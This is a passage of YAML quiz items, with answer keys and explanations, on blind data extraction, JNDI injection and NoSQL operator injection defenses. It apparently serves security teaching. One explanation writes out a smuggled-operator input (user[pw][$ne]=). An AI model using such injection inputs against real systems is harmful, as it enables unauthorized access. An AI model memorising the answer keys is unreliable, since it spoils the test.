  - Binary search mathematically decrypts the stored value directly, needing no further probing requests
  answer: 1
  explanation: |
    Instead of up to ~256 equality tests, binary search compares against
    midpoints (> 'm'? > 't'? ...) to isolate each character in roughly 7-8
    requests (log2 of the range), or extracts bit-by-bit — a large speedup that
    underscores why hiding output is not a defense.
  ref: concepts.md#efficient-blind-extraction-and-oast
- id: injection-attacks-083
  difficulty: intermediate
  tags:
  - jndi
  - concepts
  question: |
    Beyond Log4j specifically, JNDI injection is dangerous whenever an
    application:
  options:
  - Uses prepared statements with bound parameters for every one of its database queries
  - Resolves an attacker-influenced JNDI name, which can trigger remote class loading and RCE
  - Writes all of its application logs using a structured JSON field format
  - Validates that every incoming input conforms to its expected data type
  answer: 1
  explanation: |
    JNDI injection is not unique to Log4j: any code that looks up an
    attacker-controlled JNDI name over LDAP/RMI risks fetching and loading a
    remote class, yielding RCE. The defense is to never resolve untrusted JNDI
    names and to restrict remote-class-loading.
  ref: concepts.md#log4shell-and-jndi-injection
- id: injection-attacks-084
  difficulty: advanced
  tags:
  - nosql
  - defense
  - type-check
  question: |
    Which single control most broadly defeats both MongoDB operator injection
    (via JSON body or nested query-string) and simple syntax injection?
  options:
  - Renaming the MongoDB collection to a non-obvious internal name so attackers cannot guess the query target
  - Enforcing that fields expected to be scalars are strings (rejecting objects/arrays) via schema validation before they reach the query
  - Adding a WAF rule that rejects any request body containing the '$' character used by MongoDB operators
  - Encrypting every stored document at rest with a per-collection key so smuggled operator objects cannot match
  answer: 1
  explanation: |
    Type enforcement — rejecting objects/arrays where a string is expected —
    stops an attacker smuggling an operator object ($ne, $gt) whether it arrives
    as JSON or as a nested bracket query-string (user[pw][$ne]=), and keeps
    untrusted objects out of the query document. It is the primary NoSQL
    control, ahead of blocklisting or encryption.
  ref: concepts.md#nosql-syntax-blind-and-timing-injection
